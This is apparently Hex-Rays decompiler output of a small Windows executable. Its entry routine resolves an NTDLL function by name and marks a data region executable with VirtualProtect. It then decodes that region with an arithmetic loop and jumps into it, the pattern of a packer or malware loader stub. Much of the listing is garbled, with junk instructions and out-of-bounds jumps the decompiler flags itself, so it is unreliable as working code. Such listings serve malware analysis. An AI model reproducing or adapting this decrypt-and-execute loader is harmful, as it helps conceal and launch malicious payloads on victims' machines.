/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall start(char a1@<bl>, int _ESI@<esi>);
unsigned int __stdcall sub_40120A(_DWORD *a1, unsigned int a2, int a3);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall GetCurrentProcessId();
// LPWSTR __stdcall GetCommandLineW();
// HANDLE __stdcall GetProcessHeap();
// DWORD __stdcall GetFileType(HANDLE hFile);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetCurrentThreadId();
// UINT __stdcall GetOEMCP();
// DWORD __stdcall GetVersion();
// UINT __stdcall GetACP();

//-------------------------------------------------------------------------
// Data declarations

char byte_40125D[3] = { 'é', 'É', '†' }; // weak
CHAR aM8ye[] = "M.8yE"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
CHAR ProcName[] = "ZwOpenIoCompletion"; // idb
CHAR FileName[] = "LbFdONpU7.Kds"; // idb


//----- (0040100E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall start(char a1@<bl>, int _ESI@<esi>)
{
  HANDLE v2; // eax
  LPSTR v3; // eax
  int v4; // edx
  int v7; // ecx
  int v8; // ecx
  unsigned __int16 v12; // dx
  int v13; // ecx
  _BYTE *v15; // edi
  __int16 v21; // ax
  _BYTE *v22; // et0
  unsigned int v24; // esi
  int v25; // edx
  char v26; // pf
  unsigned int v29; // esi
  DWORD *v31; // [esp-2Ch] [ebp-58h]
  int v32; // [esp-10h] [ebp-3Ch]
  int v33; // [esp-10h] [ebp-3Ch]
  void *v34; // [esp-Ch] [ebp-38h]
  HMODULE v35; // [esp-Ch] [ebp-38h]
  void *v36; // [esp-4h] [ebp-30h]
  void *v37; // [esp+4h] [ebp-28h]
  FARPROC ZwOpenIoCompletion; // [esp+4h] [ebp-28h]
  unsigned int v39; // [esp+8h] [ebp-24h]
  HANDLE v41; // [esp+10h] [ebp-1Ch]
  int v42; // [esp+14h] [ebp-18h]
  HANDLE hFile; // [esp+18h] [ebp-14h]
  int v44; // [esp+24h] [ebp-8h]
  int savedregs; // [esp+2Ch] [ebp+0h]

  v2 = CreateFileA(FileName, 0x40000000u, 6u, 0, 3u, 0x105u, 0);
  v36 = v2;
  if ( v2 == (HANDLE)-1 )
  {
    GetFileType(v34);
    v35 = GetModuleHandleA(ModuleName);
    GetACP();
    ZwOpenIoCompletion = GetProcAddress(v35, ProcName);
    GetFileSize(v35, 0);
    GetFileSize((HANDLE)0xFFFFFFFF, 0);
    GetCurrentThreadId();
    CreateFileA(aM8ye, 0x40000000u, 2u, 0, 3u, 0, 0);
    GetCurrentThreadId();
    v3 = GetCommandLineA();
    v33 = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, LPSTR))ZwOpenIoCompletion)(0, 0, 0, v3);
    GetProcessHeap();
    __asm { jmp     eax }
  }
  v31 = (DWORD *)v2;
  GetFileSize(v37, 0);
  CloseHandle(v36);
  GetVersion();
  GetCurrentThreadId();
  CloseHandle(v36);
  GetCurrentProcessId();
  VirtualProtect(byte_40125D, 0xEAB0u, 0x40u, v31);
  GetCommandLineW();
  GetCommandLineW();
  GetCurrentProcessId();
  GetCurrentProcessId();
  ((void (*)(void))((char *)sub_40120A + v32 + 1073741819))();
  GetOEMCP();
  *(_DWORD *)&byte_40125D[-36] = GetVersion();
  _EAX = CloseHandle(*(HANDLE *)&byte_40125D[-28]);
  *(_DWORD *)(v4 + 2072253181) &= _ESI;
  __asm { das }
  _ZF = (_ESI & *(_DWORD *)(v4 - 1312739331)) == 0;
  *(_DWORD *)(v4 - 1312739331) &= _ESI;
  v8 = v7 - 1;
  if ( _ZF || !v8 )
  {
    *(_DWORD *)(_EAX - 20) -= 598130385;
    __asm { das }
    *(_BYTE *)v4 = -*(_BYTE *)v4;
    JUMPOUT(0x40129D);
  }
  __asm { das }
  *(_BYTE *)v4 &= a1;
  __asm
  {
    outsd
    cmpxchg esp, eax
    daa
  }
  v12 = (unsigned __int16)v41;
  v13 = v42;
  _EBX = hFile;
  LOWORD(v15) = v44;
  _AL = MEMORY[0x7D56099E];
  __asm { das }
  *(_DWORD *)v41 |= (unsigned int)hFile;
  _EAX = MEMORY[0x7C5C8CEE];
  __outdword(v12, MEMORY[0x7C5C8CEE]);
  while ( 1 )
  {
    __asm { repne sub al, 0F6h ; 'ö' }
    v22 = (_BYTE *)_EAX;
    v21 = (__int16)v15;
    v15 = v22;
    if ( _CF )
      break;
    _AX = v21 + 1;
    LOBYTE(_AX) = _AX - BYTE1(v13);
    *_EBX &= HIBYTE(_AX);
    __DS__ = savedregs;
    v24 = *MK_FP(savedregs, v13 - 4);
    __ES__ = *MK_FP(savedregs, v13);
    __asm { xlat }
    _EAX = MEMORY[0x617D5C9F]();
    if ( !v26 )
      JUMPOUT(0x4012E6);
    *(_DWORD *)(v25 - 4) &= v24;
    __asm { das }
    _AL = *(_BYTE *)v24;
    v29 = v24 + 1;
    _CF = __CFADD__(_AL, 105);
    _AL += 105;
    __asm { xlat }
    _OF = __OFADD__(_CF, *(_DWORD *)(v13 - 1902343540)) | __OFADD__(v25, _CF + *(_DWORD *)(v13 - 1902343540));
    _SF = v25 + _CF + *(_DWORD *)(v13 - 1902343540) < 0;
    *(_DWORD *)(v13 - 1902343540) += v25 + _CF;
    if ( _OF )
    {
      *(_DWORD *)(v13 - 777398563) |= v29;
      __outbyte(0x17u, _EAX);
      *(_BYTE *)v29 = __ROL1__(*(_BYTE *)v29, 1);
      *v15 = _EAX + 118;
      JUMPOUT(0x29EF7FCE);
    }
    if ( _SF )
    {
      __writeeflags(v39);
      JUMPOUT(0x4012BC);
    }
  }
  JUMPOUT(0x401294);
}
// 4012F1: positive sp value 24 has been found
// 40129B: control flows out of bounds to 40129D
// 4012BB: control flows out of bounds to 4012BC
// 40132A: control flows out of bounds to 29EF7FCE
// 4012E5: control flows out of bounds to 401294
// 401303: control flows out of bounds to 4012E6
// 401053: variable 'v34' is possibly undefined
// 401139: variable 'v37' is possibly undefined
// 4011AF: variable 'v32' is possibly undefined
// 401281: variable 'v4' is possibly undefined
// 40128F: variable 'v7' is possibly undefined
// 4012BB: variable 'v39' is possibly undefined
// 4012EC: variable 'v13' is possibly undefined
// 401303: variable 'v26' is possibly undefined
// 401305: variable 'v25' is possibly undefined

//----- (0040120A) --------------------------------------------------------
unsigned int __stdcall sub_40120A(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int result; // eax

  result = a2 >> 2;
  do
  {
    *a1 -= a3;
    *a1 = __ROL4__(*a1, 75);
    *a1 += a3;
    *a1 = -*a1;
    *a1 -= 898270834;
    *a1 -= 1439591800;
    *a1 += a3;
    *a1++ += 2028590953;
    --result;
  }
  while ( result );
  return result;
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
